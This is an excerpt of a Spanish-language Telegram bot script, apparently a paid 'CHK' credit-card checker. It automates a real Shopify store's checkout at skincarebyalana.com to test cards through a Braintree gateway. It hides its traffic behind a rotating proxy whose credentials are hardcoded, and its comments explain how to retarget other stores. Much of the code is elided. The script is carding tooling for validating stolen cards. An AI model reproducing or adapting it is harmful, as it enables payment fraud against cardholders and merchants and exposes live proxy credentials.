...
@Client.on_message(filters.command("ba", prefixes=['.','/','!','?'], case_sensitive=False) & filters.text)
def Shopify(client, message):
    try:
        ...
        if all(role not in user_data[0] for role in ['Premium', 'Seller', 'Owner']) and all(role not in user_data[0] for role in ['Grupo']):
...
<b>あ MITSURI CHK あ
[<code>あ</code>] ESTADO: <code>ON</code>
GATEWAY: <code>BANKAI</code>
PASARELA: <code>SHOPIFY + B3 $22.45</code> </b>""")
...
""")
        ...
        session.proxies = {'http': 'http://wljvucup-rotate:451mxry59xrt@p.webshare.io:80'}

        inicio = time.time()
        print("</> INICIADO...")
        #-----------PASO N° 1 REEMPLAZAR ID DEL PRODUCTO-----------#
        #--------ID DEL PRODUCTO ---------#
        payload_1 = {'id': '42773595029763'}
        
        #-----------PASO N° 2 REEMPLAZAR URL ADD CART-----------#
        req1 = session.post(url=f'https://www.skincarebyalana.com/cart/add.js', data=payload_1)
        time.sleep(1)
        print("</> PRODUCTO AGREGADO AL CARRIDO")
        
        #-----------PASO N° 3 REEMPLAZAR URL CHECKUOT-----------#
        req3 = session.post(url=f"https://www.skincarebyalana.com/checkout/")
        ...
        payload_4 = {
            ...
            "payment_session_scope": "www.skincarebyalana.com"
        }
        ...
        payload_5 = f'_method=patch&authenticity_token={authenticity_token}&previous_step=payment_method&step=&s={id_}&checkout%5Bpayment_gateway%5D=80975266051&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Bdifferent_billing_address%5D=false&checkout%5Bpost_purchase_page_requested%5D=1&checkout%5Btotal_price%5D=2245&checkout_submitted_request_url=&checkout_submitted_page_id=&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=786&checkout%5Bclient_details%5D%5Bbrowser_height%5D=641&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=180'
...
<b>MITSURI CHK - SH + B3 $22.45 USD</b>
